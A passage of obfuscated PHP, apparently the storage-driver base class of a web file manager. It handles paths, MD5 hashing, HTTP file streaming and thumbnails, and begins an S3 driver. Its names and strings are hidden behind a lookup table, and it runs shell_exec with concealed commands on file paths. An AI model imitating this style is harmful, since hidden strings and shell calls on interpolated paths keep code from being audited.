$‚·ƒ¥Âô = $ÆÁÎÌ–Õ <= $Û±ËÕáş ? $†’‡¾¯¼[95] : $†’‡¾¯¼[96]; $Îó¬İÏÇ = (!$ÆÁÎÌ–Õ ? 1 : ceil($ÆÁÎÌ–Õ / pow(1024, 3))) * 3600 * 4; $¼€ØãÖä = $this->{$‚·ƒ¥Âô}($§½õ–û¬, $Îó¬İÏÇ); if ($¼€ØãÖä) { $¼€ØãÖä[$†’‡¾¯¼[97]] = $§½õ–û¬; $¼€ØãÖä[$†’‡¾¯¼[98]] = $Ãï‡È¿È; } return $¼€ØãÖä; } public function uploadFormData($üç™„é£, $İÕœ¢± = 3600) { } public function multiUploadFormData($¶œ›ğÌÏ, $ÍÙ¹Ÿ¤õ = 3600) { } public function download($›š®Ä¨å, $õöŠ­¹„) { } public function ext($®Ù÷å†¶) { $ƒ—ÄÀ» =& $_SERVER[º·Ï‹¥³]; if (strpos($®Ù÷å†¶, $ƒ—ÄÀ»[8]) === -1) { $¦ê¬Ùæ = $®Ù÷å†¶; } else { $¦ê¬Ùæ = $this->pathThis($®Ù÷å†¶); } $¸‰Ó–ï£ = $ƒ—ÄÀ»[12]; if (strstr($¦ê¬Ùæ, $ƒ—ÄÀ»[10])) { $¸‰Ó–ï£ = substr($¦ê¬Ùæ, strrpos($¦ê¬Ùæ, $ƒ—ÄÀ»[10]) + 1); $¸‰Ó–ï£ = strtolower($¸‰Ó–ï£); } if (strlen($¸‰Ó–ï£) > 3 && preg_match($ƒ—ÄÀ»[99], $¸‰Ó–ï£, $Öîú¶š¢)) { $¸‰Ó–ï£ = $ƒ—ÄÀ»[12]; } return $¸‰Ó–ï£; } public function pathThis($¼ãƒ¿íÜ) { $“°²’›ì =& $_SERVER[º·Ï‹¥³]; $¼ãƒ¿íÜ = str_replace($“°²’›ì[100], $“°²’›ì[8], rtrim($¼ãƒ¿íÜ, $“°²’›ì[8])); $÷˜İõ­ = strrpos($¼ãƒ¿íÜ, $“°²’›ì[8]); if ($÷˜İõ­ === !1) { return $¼ãƒ¿íÜ; } return substr($¼ãƒ¿íÜ, $÷˜İõ­ + 1); } public function pathFather($Â„Ë‡î) { $†şâÂ—ô =& $_SERVER[º·Ï‹¥³]; $Â„Ë‡î = str_replace($†şâÂ—ô[100], $†şâÂ—ô[8], rtrim($Â„Ë‡î, $†şâÂ—ô[8])); $ôÜÓûÜø = strrpos($Â„Ë‡î, $†şâÂ—ô[8]); if ($ôÜÓûÜø === !1) { return $†şâÂ—ô[12]; } return substr($Â„Ë‡î, 0, $ôÜÓûÜø + 1); } public function hashSimple($Òáû—Ğ) { $£ëÌ›½ =& $_SERVER[º·Ï‹¥³]; if (!$Òáû—Ğ) { return md5($£ëÌ›½[12]); } $™äêŞ¼İ = $this->size($Òáû—Ğ); $¼Ùö’Ê = 200; $¼“™åÙ = 50; if ($™äêŞ¼İ <= $¼Ùö’Ê * $¼“™åÙ) { return $this->hashMd5($Òáû—Ğ) . $™äêŞ¼İ; } $š¬ÙÇíò = intval($™äêŞ¼İ / $¼“™åÙ); $Áã£Õ = $£ëÌ›½[12]; for ($é«â¼‹– = 0; $é«â¼‹– < $¼“™åÙ; $é«â¼‹–++) { $Áã£Õ .= $this->fileSubstr($Òáû—Ğ, $š¬ÙÇíò * $é«â¼‹–, $¼Ùö’Ê); } $Áã£Õ .= $this->fileSubstr($Òáû—Ğ, $™äêŞ¼İ - $¼Ùö’Ê, $¼Ùö’Ê); return md5($Áã£Õ) . $™äêŞ¼İ; } public static $md5Cache = array(); public function hashMd5($İªô…ëÓ) { if (!$İªô…ëÓ) { return md5($_SERVER[º·Ï‹¥³][12]); } $İªô…ëÓ = $this->iconvSystem($İªô…ëÓ); if (isset(self::$md5Cache[$İªô…ëÓ])) { return self::$md5Cache[$İªô…ëÓ]; } self::$md5Cache[$İªô…ëÓ] = $this->hashMd5Shell($İªô…ëÓ); if (!self::$md5Cache[$İªô…ëÓ]) { self::$md5Cache[$İªô…ëÓ] = @md5_file($İªô…ëÓ); } return self::$md5Cache[$İªô…ëÓ]; } private function hashMd5Shell($£ €Èî) { $®¸úÑğ =& $_SERVER[º·Ï‹¥³]; if (!$£ €Èî) { return md5($®¸úÑğ[12]); } if (!function_exists($®¸úÑğ[101])) { return !1; } $Ú±Ö¡»¡ = array($®¸úÑğ[102], $®¸úÑğ[103]); $›ğ™¤¾ = Cache::get($®¸úÑğ[104]); if (!$›ğ™¤¾) { $×¹ÊçÌˆ = BASIC_PATH . $®¸úÑğ[105]; $÷ïÖ¼ = md5_file($×¹ÊçÌˆ); $›ğ™¤¾ = $®¸úÑğ[106]; foreach ($Ú±Ö¡»¡ as $çÆÏÍø¢) { $Â ™¡˜‹ = shell_exec($çÆÏÍø¢ . "\40\42{$×¹ÊçÌˆ}\x22"); if ($Â ™¡˜‹ && substr(trim($Â ™¡˜‹), 0, 32) == $÷ïÖ¼) { $›ğ™¤¾ = $çÆÏÍø¢; break; } } Cache::set($®¸úÑğ[104], $›ğ™¤¾, 3600); } if ($›ğ™¤¾ == $®¸úÑğ[106]) { return !1; } $Â ™¡˜‹ = shell_exec($›ğ™¤¾ . "\40\42{$£ €Èî}\42"); $Â ™¡˜‹ = str_replace($®¸úÑğ[107], $®¸úÑğ[12], $Â ™¡˜‹); return substr($Â ™¡˜‹, 0, 32); } public function link($Ñã€•Ï¯) { return $Ñã€•Ï¯; } public function fileOut($ƒ´Ş±µ·, $ƒë”¦çÉ = false, $©–Öß¯Š = false, $ğâ¡›­ = '') { $ÏÍŠ¥–² =& $_SERVER[º·Ï‹¥³]; $this->cacheMethod(null, null); if (!$ƒ´Ş±µ· || !$this->exist($ƒ´Ş±µ·)) { show_json(LNG($ÏÍŠ¥–²[108]), !1, $©–Öß¯Š); } $“¤—¾øÎ = $this->getType() == $ÏÍŠ¥–²[109]; $³¢Œ‘¼ó = $GLOBALS[$ÏÍŠ¥–²[6]][$ÏÍŠ¥–²[92]][$ÏÍŠ¥–²[110]][$ÏÍŠ¥–²[111]]; $ß äÄ“º = (double) $GLOBALS[$ÏÍŠ¥–²[6]][$ÏÍŠ¥–²[92]][$ÏÍŠ¥–²[110]][$ÏÍŠ¥–²[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÊŸÎ¥Á¶ = $this->infoFull($ƒ´Ş±µ·); $Ğ’êÇ•İ = $ÊŸÎ¥Á¶[$ÏÍŠ¥–²[79]]; $¸†‰á¸ı = gmdate($ÏÍŠ¥–²[113], $ÊŸÎ¥Á¶[$ÏÍŠ¥–²[88]]); $åïè ©Ş = $©–Öß¯Š ? $©–Öß¯Š : $this->iconvApp($ÊŸÎ¥Á¶[$ÏÍŠ¥–²[32]]); $ø‡û§Á¦ = 0; $¡ú´‰Ñğ = $Ğ’êÇ•İ - 1; $Çøê„ÑÅ = $this->ext($åïè ©Ş); if (in_array($Çøê„ÑÅ, array($ÏÍŠ¥–²[114], $ÏÍŠ¥–²[115], $ÏÍŠ¥–²[116], $ÏÍŠ¥–²[117]))) { $Çøê„ÑÅ = $ÏÍŠ¥–²[118]; } if (in_array($Çøê„ÑÅ, array($ÏÍŠ¥–²[119]))) { $Çøê„ÑÅ = $ÏÍŠ¥–²[120]; } if (!$ğâ¡›­) { $ğâ¡›­ = md5($¸†‰á¸ı . $Ğ’êÇ•İ); } $ğâ¡›­ = $ÏÍŠ¥–²[121] . $ğâ¡›­ . $ÏÍŠ¥–²[121]; $òş”£¦… = get_file_mime($Çøê„ÑÅ); $¦À¼Ò¯÷ = !0; $¦À¼Ò¯÷ = isset($_GET[$ÏÍŠ¥–²[122]]) ? !1 : !0; if ($ƒë”¦çÉ === !1 && !mime_support($òş”£¦…)) { $òş”£¦… = $ÏÍŠ¥–²[123]; } header($ÏÍŠ¥–²[124]); header($ÏÍŠ¥–²[125] . $òş”£¦…); $ÜÆÃ°ËŸ = rawurlencode($åïè ©Ş); $ÜÆÃ°ËŸ = $ÏÍŠ¥–²[121] . $ÜÆÃ°ËŸ . $ÏÍŠ¥–²[126] . $ÜÆÃ°ËŸ; if ($ƒë”¦çÉ) { header($ÏÍŠ¥–²[127]); header($ÏÍŠ¥–²[128] . $ÜÆÃ°ËŸ); } else { if ($¦À¼Ò¯÷) { header($ÏÍŠ¥–²[129] . $ÜÆÃ°ËŸ); } } header($ÏÍŠ¥–²[130] . gmdate($ÏÍŠ¥–²[113], time() + 3600 * 24 * 30) . $ÏÍŠ¥–²[131]); header($ÏÍŠ¥–²[132]); header($ÏÍŠ¥–²[133]); header($ÏÍŠ¥–²[134]); if (isset($_SERVER[$ÏÍŠ¥–²[135]]) && strtotime($_SERVER[$ÏÍŠ¥–²[135]]) == $ÊŸÎ¥Á¶[$ÏÍŠ¥–²[88]]) { header($ÏÍŠ¥–²[136], !0, 304); die; } if (isset($_SERVER[$ÏÍŠ¥–²[137]]) && $_SERVER[$ÏÍŠ¥–²[137]] == $ğâ¡›­) { header($ÏÍŠ¥–²[138] . $ğâ¡›­, !0, 304); die; } header($ÏÍŠ¥–²[138] . $ğâ¡›­); header($ÏÍŠ¥–²[139] . $¸†‰á¸ı . $ÏÍŠ¥–²[131]); header($ÏÍŠ¥–²[140] . $åïè ©Ş); header($ÏÍŠ¥–²[141]); header($ÏÍŠ¥–²[142] . $Ğ’êÇ•İ); header($ÏÍŠ¥–²[143]); Hook::trigger($ÏÍŠ¥–²[144], $ƒ´Ş±µ·, $Ğ’êÇ•İ, $åïè ©Ş, $Çøê„ÑÅ); if (!$ƒë”¦çÉ && $Çøê„ÑÅ == $ÏÍŠ¥–²[145]) { if ($Ğ’êÇ•İ > 1024 * 1024 * 5) { die; } $è«§Ä€· = $this->getContent($ƒ´Ş±µ·); $è«§Ä€· = Html::clearSVG($è«§Ä€·); header($ÏÍŠ¥–²[146] . strlen($è«§Ä€·)); echo $è«§Ä€·; die; } $–Ğ„–İÄ = strtolower($_SERVER[$ÏÍŠ¥–²[147]]); if ($“¤—¾øÎ && $–Ğ„–İÄ && $³¢Œ‘¼ó) { if (strstr($–Ğ„–İÄ, $ÏÍŠ¥–²[148])) { header($ÏÍŠ¥–²[149] . $ƒ´Ş±µ·); } else { if (strstr($–Ğ„–İÄ, $ÏÍŠ¥–²[150])) { header($ÏÍŠ¥–²[151] . $ƒ´Ş±µ·); } else { if (strstr($–Ğ„–İÄ, $ÏÍŠ¥–²[152])) { header($ÏÍŠ¥–²[153] . $ƒ´Ş±µ·); } } } if ($ß äÄ“º) { header($ÏÍŠ¥–²[154] . $ß äÄ“º); } return; } if (isset($_SERVER[$ÏÍŠ¥–²[155]])) { if (preg_match($ÏÍŠ¥–²[156], $_SERVER[$ÏÍŠ¥–²[155]], $£­Š÷ ¾)) { $ø‡û§Á¦ = intval($£­Š÷ ¾[1]); $ø‡û§Á¦ = $ø‡û§Á¦ <= 0 ? 0 : ($ø‡û§Á¦ >= $¡ú´‰Ñğ ? $¡ú´‰Ñğ : $ø‡û§Á¦); if (!empty($£­Š÷ ¾[2])) { $ª¯¨ÚË = intval($£­Š÷ ¾[2]); $¡ú´‰Ñğ = $ª¯¨ÚË < $ø‡û§Á¦ ? $ø‡û§Á¦ : ($ª¯¨ÚË >= $¡ú´‰Ñğ ? $¡ú´‰Ñğ : $ª¯¨ÚË); } } header($ÏÍŠ¥–²[157]); header("\x43\x6f\x6e\x74\145\x6e\x74\x2d\x52\x61\x6e\x67\x65\72\40\142\171\164\x65\163\40{$ø‡û§Á¦}\x2d{$¡ú´‰Ñğ}\57" . $Ğ’êÇ•İ); } else { header($ÏÍŠ¥–²[158]); } header($ÏÍŠ¥–²[159]); $ÍÅÈª› = !0; if ($_SERVER[$ÏÍŠ¥–²[160]] == $ÏÍŠ¥–²[161] && $Ğ’êÇ•İ > 1204 * 1024 * 1024 * 2) { $ÍÅÈª› = !1; } if ($ÍÅÈª›) { header($ÏÍŠ¥–²[162] . ($¡ú´‰Ñğ - $ø‡û§Á¦ + 1)); } if ($_SERVER[$ÏÍŠ¥–²[163]] == $ÏÍŠ¥–²[164]) { return; } $Ç¼ªîÙ = 1024 * 100; $Ğòºä•• = 0; if ($ß äÄ“º) { $Ğòºä•• = intval(1000 * 1000 * ($Ç¼ªîÙ / $ß äÄ“º)); } while ($ø‡û§Á¦ <= $¡ú´‰Ñğ) { $œÏÄõó… = timeFloat(); check_abort(); $âëËÛØŠ = $¡ú´‰Ñğ - $ø‡û§Á¦ + 1; if ($âëËÛØŠ <= $Ç¼ªîÙ) { $Ç¼ªîÙ = $âëËÛØŠ; } echo $this->fileSubstr($ƒ´Ş±µ·, $ø‡û§Á¦, $Ç¼ªîÙ); $ø‡û§Á¦ += $Ç¼ªîÙ; if ($Ç¼ªîÙ == $âëËÛØŠ) { $ø‡û§Á¦ = $¡ú´‰Ñğ + 1; } if ($Ğòºä••) { $úù«“û© = intval(1000 * 1000 * (timeFloat() - $œÏÄõó…)); $ß¯ó«µ = $Ğòºä•• - $úù«“û©; if ($ß¯ó«µ > 5) { usleep($ß¯ó«µ); } } } } public function fileOutServer($Ë“”Î—“, $ƒ˜À¡ = false, $ä®³ÀşÍ = false, $¥ËÎ¢¬ı = '') { $this->fileOut($Ë“”Î—“, $ƒ˜À¡, $ä®³ÀşÍ, $¥ËÎ¢¬ı); } public function fileOutLink($çª–éç¦) { header($_SERVER[º·Ï‹¥³][165] . $çª–éç¦); die; } public function cacheMethod($Ğ“Í±–Ì, $®Æ¼ÊÏŒ, $Î”şæí· = null) { $°“ƒ•¬Ù =& $_SERVER[º·Ï‹¥³]; static $ÖµŸ¢ä = array(); $¼®ÑÁ÷™ = $®Æ¼ÊÏŒ ? ltrim($this->getPathOuter($®Æ¼ÊÏŒ), $°“ƒ•¬Ù[8]) : $°“ƒ•¬Ù[12]; $üÕÆ«Êœ = $°“ƒ•¬Ù[166] . $Ğ“Í±–Ì . $°“ƒ•¬Ù[167] . rtrim($¼®ÑÁ÷™, $°“ƒ•¬Ù[8]); if (is_null($Ğ“Í±–Ì)) { $ÖµŸ¢ä = array(); return; } if (is_null($®Æ¼ÊÏŒ)) { foreach ($ÖµŸ¢ä as $üÕÆ«Êœ => $éšÆÍ‰‚) { if (!strstr($üÕÆ«Êœ, $°“ƒ•¬Ù[166] . $Ğ“Í±–Ì . $°“ƒ•¬Ù[168])) { continue; } unset($ÖµŸ¢ä[$üÕÆ«Êœ]); } return; } if (!is_null($Î”şæí·)) { $ÖµŸ¢ä[$üÕÆ«Êœ] = $Î”şæí·; return; } $³ç¯ÃèÂ = isset($ÖµŸ¢ä[$üÕÆ«Êœ]) ? $ÖµŸ¢ä[$üÕÆ«Êœ] : null; if (!is_null($³ç¯ÃèÂ)) { return $³ç¯ÃèÂ; } $³ç¯ÃèÂ = $this->{$Ğ“Í±–Ì}($®Æ¼ÊÏŒ); $ÖµŸ¢ä[$üÕÆ«Êœ] = $³ç¯ÃèÂ; return $³ç¯ÃèÂ; } public function cacheMethodInfoSet($Ïµ–‡èÕ, $©å©ÓÆ¼, $ÆË”ş¢ä = false) { $©ƒÈùèë =& $_SERVER[º·Ï‹¥³]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($©ƒÈùèë[169], $Ïµ–‡èÕ, $©å©ÓÆ¼); $this->cacheMethod($©ƒÈùèë[170], $Ïµ–‡èÕ, $©å©ÓÆ¼ ? !1 : !0); if (is_array($ÆË”ş¢ä)) { $this->cacheMethod($©ƒÈùèë[171], $Ïµ–‡èÕ, $ÆË”ş¢ä); } } public function fileOutImage($äœ½Ô¡µ, $õÏ‘¥Ê¤ = 250) { $¹ÎŠ°–£ =& $_SERVER[º·Ï‹¥³]; set_timeout(); if (substr($äœ½Ô¡µ, 0, 4) == $¹ÎŠ°–£[152]) { $this->fileOutLink($äœ½Ô¡µ); } $ÆÄ‚Üì… = $this->info($äœ½Ô¡µ); $å¬ÎÌÄ = !1; $Ó×™ìùŸ = isset($GLOBALS[$¹ÎŠ°–£[172]]) ? $GLOBALS[$¹ÎŠ°–£[172]] : array(); if ($Ó×™ìùŸ && $Ó×™ìùŸ[$¹ÎŠ°–£[173]] == $ÆÄ‚Üì…[$¹ÎŠ°–£[87]]) { $ÆÄ‚Üì… = $Ó×™ìùŸ; $Â”ÍÁíÉ = $ÆÄ‚Üì…[$¹ÎŠ°–£[174]]; if ($Â”ÍÁíÉ && isset($Â”ÍÁíÉ[$¹ÎŠ°–£[175]])) { if ($Â”ÍÁíÉ[$¹ÎŠ°–£[175]] <= $õÏ‘¥Ê¤ && $Â”ÍÁíÉ[$¹ÎŠ°–£[176]] <= $õÏ‘¥Ê¤) { $å¬ÎÌÄ = !0; } } } if ($ÆÄ‚Üì…[$¹ÎŠ°–£[79]] <= 1024 * 50 || $å¬ÎÌÄ || !function_exists($¹ÎŠ°–£[177]) || $ÆÄ‚Üì…[$¹ÎŠ°–£[178]] == $¹ÎŠ°–£[179]) { return $this->fileOut($äœ½Ô¡µ, !1, $ÆÄ‚Üì…[$¹ÎŠ°–£[32]]); } $Ó¥Û¡¡Ú = kodIO::hashPath($ÆÄ‚Üì…); $²¨½“‚ = "\143\157\x76\145\x72\x5f{$Ó¥Û¡¡Ú}\137{$õÏ‘¥Ê¤}\56\160\156\147"; $ïúÈ¡Å = IO_PATH_SYSTEM_TEMP . $¹ÎŠ°–£[180]; $ÇƒóÆÇ– = IO::infoFullSimple($ïúÈ¡Å); $ıŒÑÔÀÔ = $ÇƒóÆÇ– && is_array($ÇƒóÆÇ–) ? $ÇƒóÆÇ–[$¹ÎŠ°–£[87]] : $¹ÎŠ°–£[12]; if (!$ıŒÑÔÀÔ) { $ıŒÑÔÀÔ = IO::mkdir($ïúÈ¡Å); } if ($ÆÄ‚Üì…[$¹ÎŠ°–£[181]] == $¹ÎŠ°–£[182] && isset($ÆÄ‚Üì…[$¹ÎŠ°–£[183]]) && $ÆÄ‚Üì…[$¹ÎŠ°–£[183]] == kodIO::sourceID($ıŒÑÔÀÔ)) { $ÂÂ©ö˜Ğ = $ÆÄ‚Üì…[$¹ÎŠ°–£[184]]; if ($õÏ‘¥Ê¤ <= 500) { $Å¢¨ïÉ = preg_replace($¹ÎŠ°–£[185], $¹ÎŠ°–£[186], $ÆÄ‚Üì…[$¹ÎŠ°–£[32]]); $ÂÂ©ö˜Ğ = IO::fileNameExist($ıŒÑÔÀÔ, $Å¢¨ïÉ); } return IO::fileOut(KodIO::make($ÂÂ©ö˜Ğ), !1, $ÆÄ‚Üì…[$¹ÎŠ°–£[32]]); } $Ï§Ó’üâ = IO::fileNameExist($ıŒÑÔÀÔ, $²¨½“‚); if ($Ï§Ó’üâ) { return IO::fileOut(KodIO::make($Ï§Ó’üâ), !1, $ÆÄ‚Üì…[$¹ÎŠ°–£[32]]); } if ($õÏ‘¥Ê¤ > 1000) { $this->makeImageCover($ıŒÑÔÀÔ, $äœ½Ô¡µ, $²¨½“‚, $õÏ‘¥Ê¤); $this->makeImageCover($ıŒÑÔÀÔ, $äœ½Ô¡µ, "\143\157\166\x65\162\x5f{$Ó¥Û¡¡Ú}\x5f\x32\65\x30\x2e\160\156\147", 250); $Ï§Ó’üâ = IO::fileNameExist($ıŒÑÔÀÔ, $²¨½“‚); if ($Ï§Ó’üâ) { return IO::fileOut(KodIO::make($Ï§Ó’üâ), !1, $ÆÄ‚Üì…[$¹ÎŠ°–£[32]]); } die; } $©¶¶´³£ = Cache::get($²¨½“‚); if ($©¶¶´³£ == $¹ÎŠ°–£[187] || $©¶¶´³£ == $¹ÎŠ°–£[188]) { echo $©¶¶´³£; die; } Cache::set($²¨½“‚, $¹ÎŠ°–£[188], 60); $İ††•¼Ç = array($ıŒÑÔÀÔ, $ÆÄ‚Üì…[$¹ÎŠ°–£[87]], $²¨½“‚, $õÏ‘¥Ê¤); $‰ŞÅëÜù = $¹ÎŠ°–£[189] . $ÆÄ‚Üì…[$¹ÎŠ°–£[79]] . $¹ÎŠ°–£[190] . $²¨½“‚ . $¹ÎŠ°–£[191] . $ÆÄ‚Üì…[$¹ÎŠ°–£[32]] . $¹ÎŠ°–£[192] . $ÆÄ‚Üì…[$¹ÎŠ°–£[87]]; TaskQueue::add($¹ÎŠ°–£[193], $İ††•¼Ç, $‰ŞÅëÜù, $²¨½“‚); } public function makeImageCover($èŞ¯¼•‹, $Š–±ı¤, $á¸œÈŸ, $Ş‰ÑÊÊë) { $³¢¤œá’ =& $_SERVER[º·Ï‹¥³]; if (IO::fileNameExist($èŞ¯¼•‹, $á¸œÈŸ)) { return $³¢¤œá’[194]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $íÀÁ = DATA_THUMB . $á¸œÈŸ; del_file($íÀÁ); $æÖğÀ™ = TEMP_FILES . $á¸œÈŸ; if (!@file_exists($æÖğÀ™)) { $æÖğÀ™ = $this->download($Š–±ı¤, $æÖğÀ™); } if (!@file_exists($æÖğÀ™)) { return $³¢¤œá’[195]; } ImageThumb::createThumb($æÖğÀ™, $íÀÁ, $Ş‰ÑÊÊë, $Ş‰ÑÊÊë * 10); if (@file_exists($íÀÁ)) { Cache::remove($á¸œÈŸ); return IO::move($íÀÁ, $èŞ¯¼•‹); } Cache::set($á¸œÈŸ, $³¢¤œá’[187], 600); del_file($íÀÁ); return $³¢¤œá’[196] . $æÖğÀ™ . $³¢¤œá’[74]; } public function fileOutImageServer($°»éó‘°, $±Ü®¼ŠÃ = 250) { $this->fileOutImage($°»éó‘°, $±Ü®¼ŠÃ); } public function fileNameAuto($ÍíƒâÓ, $ììşˆİƒ, $ú‡¬Ä¿¨ = REPEAT_RENAME, $ºßé¶¬ = false) { $«­³ö¬‰ =& $_SERVER[º·Ï‹¥³]; $„Ü¥ÆÒ´ = $ÍíƒâÓ === $«­³ö¬‰[12] ? $ììşˆİƒ : rtrim($ÍíƒâÓ, $«­³ö¬‰[8]) . $«­³ö¬‰[8] . $ììşˆİƒ; if ($ú‡¬Ä¿¨ == REPEAT_REPLACE || !$this->exist($„Ü¥ÆÒ´) || $ºßé¶¬ && $ú‡¬Ä¿¨ != REPEAT_RENAME_FOLDER) { return $ììşˆİƒ; } if ($ú‡¬Ä¿¨ == REPEAT_SKIP) { return !1; } $²´¾¦Å¥ = $«­³ö¬‰[10] . get_path_ext($ììşˆİƒ); $²´¾¦Å¥ = $²´¾¦Å¥ == $«­³ö¬‰[10] || $ºßé¶¬ ? $«­³ö¬‰[12] : $²´¾¦Å¥; $®‡Íñ = 1; $›Ô€¯áÔ = substr($ììşˆİƒ, 0, strlen($ììşˆİƒ) - strlen($²´¾¦Å¥)); $ÉùŸ´²Ê = $›Ô€¯áÔ . "\50{$®‡Íñ}\51{$²´¾¦Å¥}"; while ($this->exist(rtrim($ÍíƒâÓ, $«­³ö¬‰[8]) . $«­³ö¬‰[8] . $ÉùŸ´²Ê)) { $ÉùŸ´²Ê = $›Ô€¯áÔ . "\50{$®‡Íñ}\51{$²´¾¦Å¥}"; $®‡Íñ++; } return $ÉùŸ´²Ê; } private function fileNameAutoList($¡¬ó¶Àµ, $ÇæøÛïş, $½ÃîÓ¶Ë = false) { $»˜İıîÌ =& $_SERVER[º·Ï‹¥³]; $•êì¸ş = $this->listPath($¡¬ó¶Àµ, !0); $•êì¸ş = array_merge($•êì¸ş[$»˜İıîÌ[85]], $•êì¸ş[$»˜İıîÌ[86]]); $ÓõÖ—âÃ = array_to_keyvalue($•êì¸ş, $»˜İıîÌ[12], $»˜İıîÌ[32]); $Ò€¥Ù¼Œ = $»˜İıîÌ[10] . get_path_ext($ÇæøÛïş); $Ò€¥Ù¼Œ = $Ò€¥Ù¼Œ == $»˜İıîÌ[10] || $½ÃîÓ¶Ë ? $»˜İıîÌ[12] : $Ò€¥Ù¼Œ; $¦†èÚíÕ = substr($ÇæøÛïş, 0, strlen($ÇæøÛïş) - strlen($Ò€¥Ù¼Œ)); $àŞÆƒš¼ = $¦†èÚíÕ . "\50\60\x29{$Ò€¥Ù¼Œ}"; for ($ßœóêË“ = 1; $ßœóêË“ <= count($ÓõÖ—âÃ) + 1; $ßœóêË“++) { $àŞÆƒš¼ = $¦†èÚíÕ . "\50{$ßœóêË“}\51{$Ò€¥Ù¼Œ}"; if (!in_array_not_case($àŞÆƒš¼, $ÓõÖ—âÃ)) { return $àŞÆƒš¼; } } return $àŞÆƒš¼; } public function listAllFiles($¿ÁïåÅ©, $¬©©¯€) { $ßØ•È«” =& $_SERVER[º·Ï‹¥³]; if (empty($¬©©¯€)) { return array(); } $œŠ‰½æ = array_keys($¬©©¯€); $ñ¤Ÿ¹ı¬ = array(); $¿ÁïåÅ© = trim($¿ÁïåÅ©, $ßØ•È«”[8]); foreach ($¬©©¯€ as $³ı¯„ß => $¸åÃí­) { $ïş©¼úÉ = ltrim(substr(trim($³ı¯„ß, $ßØ•È«”[8]), strlen($¿ÁïåÅ©)), $ßØ•È«”[8]); if (substr($³ı¯„ß, -1) == $ßØ•È«”[8]) { $ïş©¼úÉ = rtrim($ïş©¼úÉ, $ßØ•È«”[8]) . $ßØ•È«”[8]; } $ñ¤Ÿ¹ı¬ = array_merge($ñ¤Ÿ¹ı¬, $this->slicePath($ïş©¼úÉ)); } $­°é ëì = array(); foreach (array_unique($ñ¤Ÿ¹ı¬) as $ø©éØ·Û) { $Õµ¼ƒ†½ = array($ßØ•È«”[87] => $this->getPathOuter($ßØ•È«”[8] . $¿ÁïåÅ© . $ßØ•È«”[8] . $ø©éØ·Û), $ßØ•È«”[78] => 1, $ßØ•È«”[79] => 0); if (substr($ø©éØ·Û, -1) != $ßØ•È«”[8]) { $Õµ¼ƒ†½[$ßØ•È«”[78]] = 0; $“ÎØú = $this->getPath($¿ÁïåÅ© . $ßØ•È«”[8] . $ø©éØ·Û); if (isset($¬©©¯€[$“ÎØú])) { $ù½¦ì¹í = $¬©©¯€[$“ÎØú]; if (isset($ù½¦ì¹í[$ßØ•È«”[79]])) { $Õµ¼ƒ†½[$ßØ•È«”[79]] = intval($ù½¦ì¹í[$ßØ•È«”[79]]); } if (isset($ù½¦ì¹í[$ßØ•È«”[197]])) { $Õµ¼ƒ†½[$ßØ•È«”[88]] = intval($ù½¦ì¹í[$ßØ•È«”[197]]); } } } $­°é ëì[] = $Õµ¼ƒ†½; } return $­°é ëì; } public function slicePath($½İ€Í«) { $‚úˆ® =& $_SERVER[º·Ï‹¥³]; $„à«Ì´š = explode($‚úˆ®[8], trim($½İ€Í«, $‚úˆ®[8])); $¤ñ¸¦’† = 0; do { ++$¤ñ¸¦’†; $ÏÅã÷¨ä[] = implode($‚úˆ®[8], array_slice($„à«Ì´š, 0, $¤ñ¸¦’†)) . $‚úˆ®[8]; } while ($¤ñ¸¦’† < count($„à«Ì´š)); $ÏÅã÷¨ä[count($„à«Ì´š) - 1] = $½İ€Í«; return $ÏÅã÷¨ä; } public function getHost() { $£ÁŒğû =& $_SERVER[º·Ï‹¥³]; $÷Ğ»¼Ñ = parse_url(trim($this->domain, $£ÁŒğû[8])); $ø„Ãƒõ„ = isset($÷Ğ»¼Ñ[$£ÁŒğû[198]]) ? $÷Ğ»¼Ñ[$£ÁŒğû[198]] : http_type(); $Ì”ÏÚç = isset($÷Ğ»¼Ñ[$£ÁŒğû[199]]) ? $÷Ğ»¼Ñ[$£ÁŒğû[199]] : $÷Ğ»¼Ñ[$£ÁŒğû[87]]; if (isset($÷Ğ»¼Ñ[$£ÁŒğû[200]])) { $Ì”ÏÚç .= $£ÁŒğû[4] . $÷Ğ»¼Ñ[$£ÁŒğû[200]]; } return $ø„Ãƒõ„ . $£ÁŒğû[201] . $Ì”ÏÚç; } public function pathEncode($Ù´ÚúÒâ) { $È±œà¸Ä =& $_SERVER[º·Ï‹¥³]; return str_replace($È±œà¸Ä[202], $È±œà¸Ä[8], rawurlencode($Ù´ÚúÒâ)); } public function writeLog($†èèéŞ´ = '', $Œ·ìÆ‘È = false) { $¦Üä­˜‹ =& $_SERVER[º·Ï‹¥³]; $ƒ°˜Ö‘¹ = in_array(ACTION, array($¦Üä­˜‹[203], $¦Üä­˜‹[204])); if (!$ƒ°˜Ö‘¹ && !GLOBAL_DEBUG) { return; } $Ş¬‡áºÌ = $†èèéŞ´; static $Ûª÷®Æ¨ = null; if (!$Ûª÷®Æ¨) { $Ûª÷®Æ¨ = strtoupper($this->getType()); } $†èèéŞ´ = $Ûª÷®Æ¨ . $¦Üä­˜‹[205] . $†èèéŞ´; if ($Œ·ìÆ‘È) { $¤ÁÔÊó = error_get_last(); if ($¤ÁÔÊó) { $†èèéŞ´ = array($†èèéŞ´, $¤ÁÔÊó); } } write_log($†èèéŞ´, $¦Üä­˜‹[206]); if ($ƒ°˜Ö‘¹) { throw new Exception($Ş¬‡áºÌ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¤ïå°‡Ã) { set_timeout(); require_once SDK_DIR . $_SERVER[º·Ï‹¥³][207]; parent::__construct(); $this->_init($¤ïå°‡Ã); } public function _init($Úè–Ï…) { $¢«¨»™ =& $_SERVER[º·Ï‹¥³]; $this->config = $Úè–Ï…; foreach ($Úè–Ï… as $‹Çœ‹à¤ => $åÚîá‡§) { if (isset($this->{$‹Çœ‹à¤})) { $this->{$‹Çœ‹à¤} = $åÚîá‡§; } } $this->endpoint = $Úè–Ï…[$¢«¨»™[208]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, 